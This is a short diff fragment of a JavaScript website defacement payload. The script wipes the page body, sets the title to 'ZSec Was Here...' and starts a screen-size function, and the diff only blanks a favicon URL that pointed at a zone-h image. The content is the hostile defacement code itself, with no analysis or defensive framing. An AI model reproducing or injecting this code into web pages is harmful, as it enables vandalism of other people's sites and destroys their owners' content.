@@ -3,7 +3,7 @@
 */
 document.getElementsByTagName('body')[0].innerHTML=""
 document.title="ZSec Was Here..."
-var shortc=document.createElement("link");shortc.rel="SHORTCUT ICON";shortc.href="http://www.zone-h.com/images/cflags/png/id.png";document.getElementsByTagName("head")[0].appendChild(shortc)
+var shortc=document.createElement("link");shortc.rel="SHORTCUT ICON";shortc.href="";document.getElementsByTagName("head")[0].appendChild(shortc)
 function muter2(){
 scrW=screen.availWidth
 scrH=screen.availHeight
